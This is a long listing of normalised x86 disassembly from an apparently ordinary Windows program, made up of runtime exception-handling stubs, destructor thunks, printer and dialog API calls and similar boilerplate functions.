mov eax r-xdata
retn
mov eax sub_4a8987
retn
sub_4a8987
lea ecx [ ebp - 0x1021c ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_4a7340
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
sub_4a8da0
mov eax [ esp + 0x4 ]
push 0x0
push sub_4a89c0
push eax
push 0xc21
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ DialogBoxParamA@IAT ]
retn
sub_4a965e
mov eax 0x1
retn
sub_4a9664
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a9755
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ecx ]
mov [ ebp - 0x1c ] edx
mov eax 0x1
retn
sub_4a9765
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4aa080
mov eax [ ecx + 0x4 ]
sub esp 0x8
push eax
lea ecx [ esp + 0x8 ]
push ecx
lea edx [ esp + 0x8 ]
push edx
call sub_4a9dd0
mov eax [ esp + 0xc ]
inc eax
add esp 0x14
retn
sub_4aa0a0
mov eax [ ecx + 0x4 ]
sub esp 0x8
push eax
lea ecx [ esp + 0x4 ]
push ecx
lea edx [ esp + 0xc ]
push edx
call sub_4a9dd0
mov eax [ esp + 0xc ]
inc eax
add esp 0x14
retn
sub_4aa0c0
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
inc eax
retn
xor eax eax
retn
sub_4aa0e0
mov eax [ rw-data ]
retn
sub_4aa1b0
mov al [ rw-data ]
test al al
jne r-xdata
mov eax [ rw-data ]
inc eax
retn
xor eax eax
retn
sub_4aa5d0
mov eax ecx
xor ecx ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x20 ] 0xf
mov [ eax + 0xc ] cl
mov cl [ esp + 0x4 ]
mov [ eax ] 0x80000000
mov [ eax + 0x4 ] cl
retn 0x4
sub_4aa600
mov eax ecx
xor ecx ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x20 ] 0xf
mov [ eax + 0xc ] cl
mov ecx [ esp + 0x4 ]
mov [ eax ] 0x80000001
mov [ eax + 0x4 ] ecx
retn 0x4
sub_4aa630
mov eax ecx
xor ecx ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x20 ] 0xf
mov [ eax + 0xc ] cl
mov ecx [ esp + 0x4 ]
mov [ eax ] 0x80000002
mov [ eax + 0x4 ] ecx
retn 0x4
sub_4aa880
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_4ad010
xor eax eax
retn
sub_4ad020
mov eax [ esp + 0x4 ]
add ecx 0x8
mov [ eax ] ecx
mov al 0x1
retn 0x4
sub_4ad030
push esi
mov esi ecx
call sub_4ad050
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_4ad050
push esi
mov esi ecx
lea ecx [ esi + 0x8 ]
call sub_403b20
mov [ esi ] r--data
pop esi
retn
sub_4adb30
xor al al
retn 0x4
sub_4adb40
mov eax [ ecx + 0x4 ]
push 0x0
push 0x1
push eax
call sub_4aca30
add esp 0xc
xor eax eax
retn
sub_4adb60
lea eax [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
push eax
push ecx
call sub_4ac6d0
add esp 0x8
xor eax eax
retn
sub_4adff0
mov ecx rw-data
call sub_401420
xor eax eax
retn
sub_4b21f0
xor eax eax
retn 0xc
sub_4b2440
push esi
mov esi ecx
call sub_4b2220
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_4b66ed#2
add esp 0x4
j_sub_4b66db
jmp sub_4b66db
SetPrinterA
jmp [ SetPrinterA@IAT ]
DocumentPropertiesA
jmp [ DocumentPropertiesA@IAT ]
ClosePrinter
jmp [ ClosePrinter@IAT ]
GetPrinterA
jmp [ GetPrinterA@IAT ]
OpenPrinterA
jmp [ OpenPrinterA@IAT ]
j_sub_4b573e#2
jmp sub_4b573e
sub_4b57e7
mov [ ecx ] r--data
jmp sub_4b60f6
sub_4b57f2
push esi
mov esi ecx
call sub_4b57e7
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_4b66ed#2
pop ecx
sub_4b580e
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_4b60ac
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
j_sub_4b66ed#2
jmp sub_4b66ed
sub_4b5dda
mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov [ esi ] eax
call sub_4b7c13
mov eax [ eax + 0x84 ]
mov [ esi + 0x4 ] eax
call sub_4b7c13
mov [ eax + 0x84 ] esi
mov eax esi
pop esi
retn
sub_4b5f90
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_4b601a
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_4b5f90
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_4b6046
push ebx
push ecx
mov ebx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_4b605e
mov eax ecx
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
retn
sub_4b60f6
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_4b66ed
pop ecx
sub_4b610c
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_4b6119
push esi
mov esi ecx
call sub_4b60f6
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_4b66ed#2
pop ecx
sub_4b615e
push esi
mov esi ecx
call sub_4b6135
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_4b66ed#2
pop ecx
sub_4b626a
retn
sub_4b626b
mov eax sub_4b855a
mov [ rw-data ] eax
mov [ rw-data ] sub_4b81d4
mov [ rw-data ] sub_4b8239
mov [ rw-data ] sub_4b8198
mov [ rw-data ] sub_4b821f
mov [ rw-data ] eax
retn
sub_4b62a3
call sub_4b626b
call sub_4b85fd
mov [ rw-data ] eax
call sub_4b85ab
fnclex
retn
sub_4b6383
mov esp [ ebp - 0x18 ]
push [ ebp - 0x1c ]
call sub_4b87b1
int3
sub_4b6613
call sub_4b865f
retn
sub_4b6619
push [ esp + 0x4 ]
call sub_4b65e1
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
retn
sub_4b662b
push 0x19
call sub_4b6c7f
pop ecx
retn
sub_4b66a6
push 0x4
call sub_4b8046
pop ecx
retn
sub_4b6740
push 0x4
call sub_4b8046
pop ecx
retn
sub_4b67e5
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
cmp [ eax ] 0xe06d7363
je r-xdata
call sub_4b7b80
mov [ ebp - 0x24 ] 0x0
mov eax [ ebp - 0x24 ]
retn
sub_4b685c
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
retn
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4b67b6
sub_4b68be
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
retn
push [ ebp + 0x18 ]
push [ ebp - 0x20 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4b67b6
j_sub_4b692d
jmp sub_4b692d
sub_4b69ba
call sub_4b7c13
mov ecx [ esp + 0x4 ]
mov [ eax + 0x14 ] ecx
retn
sub_4b69c7
call sub_4b7c13
mov ecx [ eax + 0x14 ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ eax + 0x14 ] ecx
mov eax ecx
shr eax 0x10
and eax 0x7fff
retn
j_sub_4b66ed
jmp j_sub_4b66ed#2
sub_4b6ba9
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_4b5fb2
add esp 0x8
pop ebp
retn 0x4
sub_4b6c6e
push 0x4
call sub_4b8046
pop ecx
retn
sub_4b6e60
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x70 ] ecx
push eax
push ecx
call sub_4b87e0
pop ecx
pop ecx
retn
sub_4b6e74
mov esp [ ebp - 0x18 ]
mov edi [ ebp - 0x70 ]
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_4b87d1
or [ ebp - 0x4 ] 0xffffffff
mov eax edi
lea esp [ ebp - 0x7c ]
call sub_4b897f
retn
push edi
call sub_4b87b1
sub_4b7290
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
sub_4b72f5
push sub_4b72af
call [ SetUnhandledExceptionFilter@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_4b7308
push [ rw-data ]
call [ SetUnhandledExceptionFilter@IAT ]
retn
sub_4b7364
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
je r-xdata
call sub_4b7c13
and [ eax + 0x80 ] 0x0
jmp sub_4b7b80
xor eax eax
retn
sub_4b73f5
mov eax [ ebp - 0x14 ]
call sub_4b7364
retn
sub_4b7435
call sub_4b7c13
cmp [ eax + 0x80 ] 0x0
jle r-xdata
retn
call sub_4b7c13
add eax 0x80
dec [ eax ]
sub_4b7484
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_4b748d
mov esp [ ebp - 0x18 ]
jmp sub_4b7b80
sub_4b77c9
xor eax eax
inc eax
retn
sub_4b77cd
mov esp [ ebp - 0x18 ]
jmp sub_4b7b80
sub_4b7ba5
xor eax eax
inc eax
retn
sub_4b7bb5
push 0x8
push r--data
call sub_4b8944
mov eax [ rw-data ]
test eax eax
je r-xdata
jmp sub_4b7b80
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
sub_4b7bd2
xor eax eax
inc eax
retn
sub_4b7c00
mov eax [ esp + 0x4 ]
mov [ eax + 0x54 ] rw-data
mov [ eax + 0x14 ] 0x1
retn
sub_4b7dda
push 0xd
call sub_4b8046
pop ecx
retn
sub_4b7de6
push 0xc
call sub_4b8046
pop ecx
retn
sub_4b821f
mov eax [ esp + 0x4 ]
fld [ eax ]
fcomp [ r--data ]
fnstsw ax
test ah 0x1
jne r-xdata
xor eax eax
retn
xor eax eax
inc eax
retn
sub_4b85ab
push 0x30000
push 0x10000
call sub_4bba32
pop ecx
pop ecx
retn
sub_4b8656
push 0x8
call sub_4b80da
pop ecx
retn
sub_4b865f
push 0x8
call sub_4b8046
pop ecx
retn
sub_4b87a0
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_4b86cd
add esp 0xc
retn
sub_4b87b1
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_4b86cd
add esp 0xc
retn
sub_4b87c2
push 0x1
push 0x0
push 0x0
call sub_4b86cd
add esp 0xc
retn
sub_4b87d1
push 0x1
push 0x1
push 0x0
call sub_4b86cd
add esp 0xc
retn
sub_4b897f
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
leave
push ecx
retn
sub_4b8b7d
push 0x4
call sub_4b8046
pop ecx
retn
sub_4b8c2f
push 0x4
call sub_4b8046
pop ecx
retn
sub_4b8c38
cmp [ rw-data ] 0x2
jne r-xdata
push 0x3
pop eax
retn
cmp [ rw-data ] 0x5
jb r-xdata
xor eax eax
inc eax
retn
sub_4ba337
push 0xc
call sub_4b8046
pop ecx
retn
sub_4babdb
xor eax eax
inc eax
retn
sub_4bac1f
xor eax eax
inc eax
retn
sub_4bac36
push esi
push [ esp + 0xc ]
xor esi esi
push [ esp + 0xc ]
inc esi
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_4bac52
push esi
push [ esp + 0xc ]
xor esi esi
push [ esp + 0xc ]
inc esi
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_4bac6e
push esi
push [ esp + 0x8 ]
xor esi esi
inc esi
call [ IsBadCodePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_4bb165
push 0xd
call sub_4b8046
pop ecx
retn
sub_4bb16e
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_4bb01e
pop ecx
mov [ rw-data ] 0x1
sub_4bb18c
push [ esp + 0x4 ]
call [ InitializeCriticalSection@IAT ]
xor eax eax
inc eax
retn 0x8
sub_4bb1f9
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
xor eax eax
inc eax
retn
sub_4bb207
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x20 ] 0xc0000017
jne r-xdata
xor eax eax
or [ ebp - 0x4 ] 0xffffffff
call sub_4b897f
retn
push 0x8
call [ SetLastError@IAT ]
sub_4bb329
call sub_4b7c13
mov eax [ eax + 0x64 ]
cmp eax [ rw-data ]
je r-xdata
push [ esp + 0x4 ]
push eax
call sub_4bb261
pop ecx
pop ecx
retn
call sub_4ba305
sub_4bb457
xor eax eax
xor eax eax
retn
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ esp + 0x4 ]
cmp [ ecx + eax * 4 ] 0x0
jne r-xdata
xor eax eax
inc eax
retn
sub_4bb643
push rw-data
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_4bb4eb
add esp 0xc
retn
sub_4bb659
push rw-data
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_4bb4eb
add esp 0xc
retn
sub_4bb898
push 0x8
push r--data
call sub_4b8944
and [ ebp - 0x4 ] 0x0
push 0x0
push 0x1
call sub_4bd730
sub_4bb8b9
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push 0x3
call [ ExitProcess@IAT ]
int3
sub_4bb8c9
cmp ecx [ rw-data ]
jne r-xdata
jmp sub_4bb898
retn
sub_4bb8d7
push 0x2
call sub_4b6c7f
pop ecx
retn
sub_4bba32
mov eax [ esp + 0x8 ]
and eax 0xfff7ffff
push eax
push [ esp + 0x8 ]
call sub_4bba00
pop ecx
pop ecx
retn
sub_4bbb43
push ebx
call sub_4bd9ad
pop ecx
retn
sub_4bbd93
push ebx
call sub_4bd9ad
pop ecx
retn
sub_4bbece
call sub_4bdc4d
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp sub_4bda52
sub_4bbfe6
call sub_4b7c13
mov eax [ eax + 0x64 ]
cmp eax [ rw-data ]
je r-xdata
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push eax
call sub_4bbf86
add esp 0xc
retn
call sub_4ba305
sub_4bc17e
xor eax eax
inc eax
retn
sub_4bc8da
push 0x4
push 0x0
push [ esp + 0xc ]
call sub_4bc8a9
add esp 0xc
retn
sub_4bca54
cmp [ ebp - 0x1c ] ecx
je r-xdata
retn
push ecx
call sub_4b8046
pop ecx
sub_4bcb88
xor eax eax
inc eax
retn
sub_4bcc56
xor eax eax
inc eax
retn
sub_4bcd8b
xor eax eax
inc eax
retn
sub_4bd76b
xor eax eax
inc eax
retn
sub_4bd9ad
mov eax [ esp + 0x4 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
retn
sub_4bdae4
push 0x1
call sub_4b8046
pop ecx
retn
sub_4bdc18
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_4bbf63
pop ecx
pop ecx
retn
sub_4bdc44
push 0x1
call sub_4b8046
pop ecx
retn
sub_4bdc4d
push 0x1
call sub_4bdb78
pop ecx
retn
sub_4bdd74
xor eax eax
inc eax
retn
sub_4be3cf
push esi
call sub_4bbf34
pop ecx
retn
sub_4be477
push ebx
call sub_4bd9ad
pop ecx
retn
sub_4be5fb
push ebx
call sub_4bd9ad
pop ecx
retn
sub_4be650
lea eax [ edx - 0x1 ]
pop ebx
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_4be730
mov eax r--data
jmp sub_4b5c95
sub_4be740
lea ecx [ ebp + 0x4 ]
jmp sub_4480e0
sub_4be748
mov eax r--data
jmp sub_4b5c95
sub_4be760
lea ecx [ ebp - 0x28 ]
jmp sub_4480e0
sub_4be768
mov eax r--data
jmp sub_4b5c95
sub_4be780
mov ecx [ ebp - 0x10 ]
jmp sub_4480e0
sub_4be788
mov eax r--data
jmp sub_4b5c95
sub_4be7a0
lea ecx [ ebp - 0x64 ]
jmp sub_4480e0
sub_4be7a8
lea ecx [ ebp - 0x48 ]
jmp sub_4480e0
sub_4be7b0
lea ecx [ ebp + 0x8 ]
jmp sub_401050
sub_4be7b8
lea ecx [ ebp - 0x80 ]
jmp sub_4480e0
sub_4be7c0
mov eax r--data
jmp sub_4b5c95
sub_4be7d0
mov ecx [ ebp - 0x10 ]
jmp sub_4b60f6
sub_4be7d8
mov eax r--data
jmp sub_4b5c95
sub_4be7f0
lea ecx [ ebp - 0x50 ]
jmp sub_4480e0
sub_4be7f8
mov eax r--data
jmp sub_4b5c95
sub_4be810
mov eax [ ebp + 0x4 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_401000
add esp 0x8
retn
sub_4be821
mov eax r--data
jmp sub_4b5c95
sub_4be830
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_401000
add esp 0x8
retn
sub_4be841
mov eax r--data
jmp sub_4b5c95
sub_4be850
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_401000
add esp 0x8
retn
sub_4be861
mov eax r--data
jmp sub_4b5c95
sub_4be870
mov eax r--data
jmp sub_4b5c95
sub_4be880
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_401000
add esp 0x8
retn
sub_4be891
mov eax r--data
jmp sub_4b5c95
sub_4be8a0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_401000
add esp 0x8
retn
sub_4be8b1
mov eax r--data
jmp sub_4b5c95
sub_4be8c0
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_401000
add esp 0x8
retn
sub_4be8d1
mov eax r--data
jmp sub_4b5c95
sub_4be8e0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_401000
add esp 0x8
retn
sub_4be8f1
mov eax r--data
jmp sub_4b5c95
sub_4be900
lea ecx [ ebp - 0x34 ]
jmp sub_4480e0
sub_4be908
mov eax r--data
jmp sub_4b5c95
sub_4be920
lea ecx [ ebp - 0x50 ]
jmp sub_401ae0
sub_4be928
mov eax r--data
jmp sub_4b5c95
sub_4be940
lea ecx [ ebp - 0x8 ]
jmp sub_4014d0
sub_4be948
mov eax r--data
jmp sub_4b5c95
sub_4be960
lea ecx [ ebp - 0x31c ]
jmp sub_4014d0
sub_4be96b
mov eax r--data
jmp sub_4b5c95
sub_4be980
lea ecx [ ebp - 0x210 ]
jmp sub_4014d0
sub_4be98b
lea ecx [ ebp - 0x230 ]
jmp sub_4480e0
sub_4be996
mov eax r--data
jmp sub_4b5c95
sub_4be9a0
lea ecx [ ebp - 0x10 ]
jmp sub_4014d0
sub_4be9a8
mov eax r--data
jmp sub_4b5c95
sub_4be9c0
lea ecx [ ebp - 0x18 ]
jmp sub_4014d0
sub_4be9c8
lea ecx [ ebp - 0x14 ]
jmp sub_401050
sub_4be9d0
mov eax r--data
jmp sub_4b5c95
sub_4be9e0
lea ecx [ ebp + 0x8 ]
jmp sub_4480e0
sub_4be9e8
lea ecx [ ebp - 0x14 ]
jmp sub_401050
sub_4be9f0
mov eax r--data
jmp sub_4b5c95
sub_4bea00
lea ecx [ ebp - 0x44 ]
jmp sub_4480e0
sub_4bea08
lea ecx [ ebp - 0x64 ]
jmp sub_4480e0
sub_4bea10
lea ecx [ ebp - 0x20 ]
jmp sub_401050
sub_4bea18
lea ecx [ ebp - 0x9c ]
jmp sub_4480e0
sub_4bea23
lea ecx [ ebp - 0x24 ]
jmp sub_401050
sub_4bea2b
lea ecx [ ebp - 0x28 ]
jmp sub_4014d0
sub_4bea33
lea ecx [ ebp - 0x18 ]
jmp sub_401050
sub_4bea3b
mov eax r--data
jmp sub_4b5c95
sub_4bea50
lea ecx [ ebp + 0x8 ]
jmp sub_401050
sub_4bea58
lea ecx [ ebp - 0x14 ]
jmp sub_401050
sub_4bea60
mov eax r--data
jmp sub_4b5c95
sub_4bea70
lea ecx [ ebp + 0x4 ]
jmp sub_401050
sub_4bea78
lea ecx [ ebp - 0x28 ]
jmp sub_4480e0
sub_4bea80
mov eax r--data
jmp sub_4b5c95
sub_4bea90
lea ecx [ ebp - 0x14 ]
jmp sub_401050
sub_4bea98
mov eax r--data
jmp sub_4b5c95
sub_4beab0
lea ecx [ ebp + 0x4 ]
jmp sub_401050
sub_4beab8
mov eax r--data
jmp sub_4b5c95
sub_4bead0
lea ecx [ ebp - 0x14 ]
jmp sub_401050
sub_4bead8
mov eax r--data
jmp sub_4b5c95
sub_4beaf0
lea ecx [ ebp - 0x18 ]
jmp sub_401050
sub_4beaf8
mov eax r--data
jmp sub_4b5c95
sub_4beb10
lea ecx [ ebp - 0x88 ]
jmp sub_401a90
sub_4beb1b
mov eax r--data
jmp sub_4b5c95
sub_4beb30
lea ecx [ ebp + 0x4 ]
jmp sub_401a90
sub_4beb38
lea ecx [ ebp - 0xac ]
jmp sub_401b30
sub_4beb43
mov eax r--data
jmp sub_4b5c95
sub_4beb50
lea ecx [ ebp + 0x4 ]
jmp sub_4480e0
sub_4beb58
lea ecx [ ebp - 0x198 ]
jmp sub_4480e0
sub_4beb63
lea ecx [ ebp - 0x178 ]
jmp sub_403ab0
sub_4beb6e
lea ecx [ ebp - 0x168 ]
jmp sub_4480e0
sub_4beb79
mov eax r--data
jmp sub_4b5c95
sub_4beb90
lea ecx [ ebp - 0x14 ]
jmp sub_4014d0
sub_4beb98
mov eax r--data
jmp sub_4b5c95
sub_4bebb0
lea ecx [ ebp + 0x4 ]
jmp sub_401a90
sub_4bebb8
lea ecx [ ebp - 0x18c ]
jmp sub_4014d0
sub_4bebc3
lea ecx [ ebp - 0x1a8 ]
jmp sub_4480e0
sub_4bebce
lea ecx [ ebp - 0x184 ]
jmp sub_401ae0
sub_4bebd9
mov eax r--data
jmp sub_4b5c95
sub_4bebf0
lea ecx [ ebp - 0x208 ]
jmp sub_4014d0
sub_4bebfb
lea ecx [ ebp - 0x250 ]
jmp sub_4480e0
sub_4bec06
lea ecx [ ebp - 0x224 ]
jmp sub_4480e0
sub_4bec11
lea ecx [ ebp - 0x234 ]
jmp j_sub_403b20
sub_4bec1c
lea ecx [ ebp - 0x200 ]
jmp sub_401a00
sub_4bec27
mov eax r--data
jmp sub_4b5c95
sub_4bec40
lea ecx [ ebp - 0x24 ]
jmp j_sub_402040
sub_4bec48
lea ecx [ ebp - 0x114 ]
jmp sub_4016b0
sub_4bec53
lea ecx [ ebp - 0xe4 ]
jmp sub_401a90
sub_4bec5e
lea ecx [ ebp - 0x140 ]
jmp sub_4480e0
sub_4bec69
lea ecx [ ebp - 0x178 ]
jmp sub_4480e0
sub_4bec74
lea ecx [ ebp - 0x114 ]
jmp sub_4480e0
sub_4bec7f
lea ecx [ ebp - 0x15c ]
jmp sub_4480e0
sub_4bec8a
lea ecx [ ebp - 0x28 ]
jmp sub_4014d0
sub_4bec92
lea ecx [ ebp - 0x74 ]
jmp sub_4480e0
sub_4bec9a
mov eax r--data
jmp sub_4b5c95
sub_4becb0
lea ecx [ ebp - 0x148 ]
jmp sub_4480e0
sub_4becbb
mov eax r--data
jmp sub_4b5c95
sub_4becd0
lea ecx [ ebp - 0x88 ]
jmp sub_401a90
sub_4becdb
lea ecx [ ebp - 0x14 ]
jmp sub_401050
sub_4bece3
lea ecx [ ebp - 0x114 ]
jmp sub_401a90
sub_4becee
mov eax r--data
jmp sub_4b5c95
sub_4bed00
lea ecx [ ebp - 0x48 ]
jmp sub_4480e0
sub_4bed08
lea ecx [ ebp - 0x24 ]
jmp j_sub_403b20
sub_4bed10
lea ecx [ ebp - 0x1c4 ]
jmp sub_4480e0
sub_4bed1b
lea ecx [ ebp - 0x68 ]
jmp sub_4480e0
sub_4bed23
lea ecx [ ebp - 0x14 ]
jmp sub_401050
sub_4bed2b
lea ecx [ ebp - 0x24 ]
jmp j_sub_403b20
sub_4bed33
lea ecx [ ebp - 0x11c ]
jmp sub_401a00
sub_4bed3e
lea ecx [ ebp - 0x24 ]
jmp j_sub_403b20
sub_4bed46
lea ecx [ ebp - 0x11c ]
jmp sub_401a00
sub_4bed51
mov eax r--data
jmp sub_4b5c95
sub_4bed60
lea ecx [ ebp + 0x4 ]
jmp sub_40a4b0
sub_4bed68
mov ecx [ ebp - 0x10 ]
jmp sub_40a330
sub_4bed70
mov ecx [ ebp - 0x10 ]
add ecx 0x38
jmp sub_40a4b0
sub_4bed7b
mov eax r--data
jmp sub_4b5c95
sub_4bed90
mov ecx [ ebp - 0x10 ]
jmp sub_40a330
sub_4bed98
mov eax r--data
jmp sub_4b5c95
sub_4bedb0
lea ecx [ ebp + 0x4 ]
jmp sub_40a360
sub_4bedb8
mov ecx [ ebp - 0x10 ]
jmp sub_40a480
sub_4bedc0
mov ecx [ ebp - 0x10 ]
add ecx 0x2c
jmp sub_40a360
sub_4bedcb
mov eax r--data
jmp sub_4b5c95
sub_4bede0
mov ecx [ ebp - 0x10 ]
jmp sub_40a480
sub_4bede8
mov eax r--data
jmp sub_4b5c95
sub_4bee00
lea ecx [ ebp + 0x4 ]
jmp sub_40b360
sub_4bee08
mov ecx [ ebp - 0x10 ]
jmp sub_40a330
sub_4bee10
mov ecx [ ebp - 0x10 ]
add ecx 0x38
jmp sub_40b360
sub_4bee1b
mov eax r--data
jmp sub_4b5c95
sub_4bee30
lea ecx [ ebp - 0x4a8 ]
jmp sub_40b360
sub_4bee3b
mov eax [ ebp - 0x4a0 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x8 ]
jmp sub_40a3b0
sub_4bee55
lea ecx [ ebp - 0x49c ]
jmp sub_43a1f0
sub_4bee60
mov eax r--data
jmp sub_4b5c95
sub_4bee70
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
call sub_401000
add esp 0x8
retn
sub_4bee81
mov eax r--data
jmp sub_4b5c95
sub_4bee90
lea ecx [ ebp - 0x50 ]
jmp sub_4480e0
sub_4bee98
mov eax r--data
jmp sub_4b5c95
sub_4beeb0
lea ecx [ ebp - 0x28 ]
jmp sub_4480e0
sub_4beeb8
mov eax r--data
jmp sub_4b5c95
sub_4beed0
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_401000
add esp 0x8
retn
sub_4beee1
mov eax r--data
jmp sub_4b5c95
sub_4beef0
lea ecx [ ebp - 0x24 ]
jmp sub_40b100
sub_4beef8
mov eax r--data
jmp sub_4b5c95
sub_4bef10
mov eax r--data
jmp sub_4b5c95
sub_4bef20
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x18 ]
push ecx
call sub_401000
add esp 0x8
retn
sub_4bef31
mov eax r--data
jmp sub_4b5c95
sub_4bef40
mov eax r--data
jmp sub_4b5c95
sub_4bef50
mov eax r--data
jmp sub_4b5c95
sub_4bef60
mov eax r--data
jmp sub_4b5c95
sub_4bef70
lea ecx [ ebp + 0x8 ]
jmp sub_40b100
sub_4bef78
mov eax r--data
jmp sub_4b5c95
sub_4bef90
mov eax r--data
jmp sub_4b5c95
sub_4befa0
lea ecx [ ebp - 0x270 ]
jmp sub_4480e0
sub_4befab
lea ecx [ ebp - 0x290 ]
jmp sub_4480e0
sub_4befb6
mov eax r--data
jmp sub_4b5c95
sub_4befc0
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_401000
add esp 0x8
retn
sub_4befd1
mov eax r--data
jmp sub_4b5c95
sub_4befe0
lea ecx [ ebp - 0x101fc ]
jmp sub_40e430
sub_4befeb
